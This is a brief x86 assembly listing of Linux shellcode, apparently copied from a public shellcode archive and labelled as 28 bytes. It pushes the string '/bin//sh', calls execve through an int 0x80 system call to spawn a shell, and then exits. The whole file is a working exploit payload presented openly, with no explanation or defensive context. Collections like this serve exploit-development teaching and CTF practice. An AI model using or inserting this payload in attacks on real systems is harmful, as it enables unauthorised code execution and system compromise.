;http://shell-storm.org/shellcode/files/shellcode-811.php
;shellcode length : 28 bytes
xor    eax,eax
push   eax
push   0x68732f2f
push   0x6e69622f
mov    ebx,esp
mov    ecx,eax
mov    edx,eax
mov    al,0xb
int    0x80
xor    eax,eax
inc    eax
int    0x80
